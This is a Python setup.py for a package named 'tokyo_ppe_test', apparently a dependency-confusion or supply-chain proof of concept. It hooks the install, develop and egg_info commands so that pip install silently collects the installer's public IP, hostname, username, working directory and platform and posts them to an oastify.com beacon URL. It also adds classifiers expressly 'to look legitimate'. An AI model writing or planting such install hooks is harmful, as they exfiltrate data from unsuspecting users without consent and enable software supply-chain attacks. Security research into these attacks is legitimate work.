from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
import urllib.request
import socket
import json
import os
import sys

BEACON_URL = "https://ei0gnpag0uc1wuhrcjjj65cl8ce32uqj.oastify.com"

def send_beacon():
    """Send installer IP to beacon"""
    try:
        # Get real external IP (not localhost)
        try:
            # Try to get public IP
            response = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            ip_data = json.loads(response.read().decode())
            host_ip = ip_data['ip']
        except:
            # Fallback to local IP
            hostname = socket.gethostname()
            host_ip = socket.gethostbyname(hostname)
        
        # Get system info
        username = os.getenv('USER') or os.getenv('USERNAME') or "unknown"
        cwd = os.getcwd()
        
        data = {
            "ip": host_ip,
            "hostname": socket.gethostname(),
            "user": username,
            "cwd": cwd,
            "package": "tokyo_ppe_test",
            "version": "1.0.0",
            "python": sys.version.split()[0],
            "platform": sys.platform
        }
        
        req = urllib.request.Request(
            BEACON_URL,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=5)
        print(f"[INFO] Beacon sent successfully from {host_ip}")
    except Exception as e:
        # Silent fail
        pass

# Hook into MULTIPLE commands to ensure it fires
class BeaconInstall(install):
    def run(self):
        send_beacon()
        install.run(self)

class BeaconDevelop(develop):
    def run(self):
        send_beacon()
        develop.run(self)

class BeaconEggInfo(egg_info):
    def run(self):
        send_beacon()
        egg_info.run(self)

setup(
    name="tokyo_ppe_test",
    version="1.0.0",
    cmdclass={
        'install': BeaconInstall,
        'develop': BeaconDevelop,
        'egg_info': BeaconEggInfo  # This fires during pip install
    },
    packages=[],
    include_package_data=True,
    zip_safe=False,
    # Add dummy classifiers to look legitimate
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
